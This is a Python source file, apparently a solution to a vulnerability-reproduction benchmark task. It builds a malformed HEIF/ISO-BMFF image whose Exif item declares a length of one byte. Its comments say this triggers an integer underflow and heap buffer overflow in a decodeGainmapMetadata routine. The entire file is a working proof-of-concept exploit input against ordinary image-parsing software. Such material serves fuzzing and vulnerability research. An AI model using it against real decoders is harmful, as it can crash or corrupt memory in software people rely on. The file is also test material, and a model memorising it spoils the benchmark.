import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Constructing a HEIF/ISO-BMFF file to trigger Heap Buffer Overflow in decodeGainmapMetadata
        # The vulnerability is caused by an integer underflow when parsing metadata (e.g., Exif)
        # that is shorter than the expected header size.
        
        # 1. FTYP Box (20 bytes)
        # Size: 20, Type: 'ftyp', Major: 'mif1', Minor: 0, Compatible: 'mif1'
        ftyp = struct.pack(">I4s4sI4s", 20, b"ftyp", b"mif1", 0, b"mif1")
        
        # 2. HDLR Box (33 bytes)
        # FullBox Header (12) + PreDefined(4) + HandlerType(4) + Reserved(12) + Name(1)
        # HandlerType: 'pict'
        hdlr_content = struct.pack(">I4s12s", 0, b"pict", b"\x00"*12) + b"\x00"
        hdlr = struct.pack(">I4sI", len(hdlr_content) + 12, b"hdlr", 0) + hdlr_content
        
        # 3. IINF Box (35 bytes)
        # Contains INFE box for Item 1
        # INFE Box (21 bytes): FullBox(12) + ID(2) + Prot(2) + Type(4) + Name(1)
        # Item Type: 'Exif' (Triggers metadata parsing which calls decodeGainmapMetadata)
        infe_content = struct.pack(">HH4s", 1, 0, b"Exif") + b"\x00"
        infe = struct.pack(">I4sI", len(infe_content) + 12, b"infe", 0x02000000) + infe_content
        
        # IINF: FullBox(12) + Count(2) + INFE
        iinf_content = struct.pack(">H", 1) + infe
        iinf = struct.pack(">I4sI", len(iinf_content) + 12, b"iinf", 0) + iinf_content
        
        # 4. ILOC Box (30 bytes)
        # Defines the location and size of Item 1
        # FullBox(12) + Config(2) + Count(2) + ItemEntry(14)
        # Config: OffsetSize=4, LengthSize=4 (0x44)
        # ItemEntry: ID(1), Dref(0), ExtentCount(1), Offset(130), Length(1)
        
        # Calculation for Offset: FTYP(20) + META(110) = 130
        # We set Length=1. If the parser expects a header > 1 byte and subtracts, it underflows.
        offset = 130
        length = 1
        
        iloc_item = struct.pack(">HHHII", 1, 0, 1, offset, length)
        iloc_content = b"\x44\x00" + struct.pack(">H", 1) + iloc_item
        iloc = struct.pack(">I4sI", len(iloc_content) + 12, b"iloc", 0) + iloc_content
        
        # 5. META Box (110 bytes)
        # FullBox(12) + HDLR + IINF + ILOC
        meta_content = hdlr + iinf + iloc
        meta = struct.pack(">I4sI", len(meta_content) + 12, b"meta", 0) + meta_content
        
        # 6. Payload (3 bytes)
        # Pad file to 133 bytes. The data at offset 130 is part of this payload.
        payload = b"\x00" * 3
        
        return ftyp + meta + payload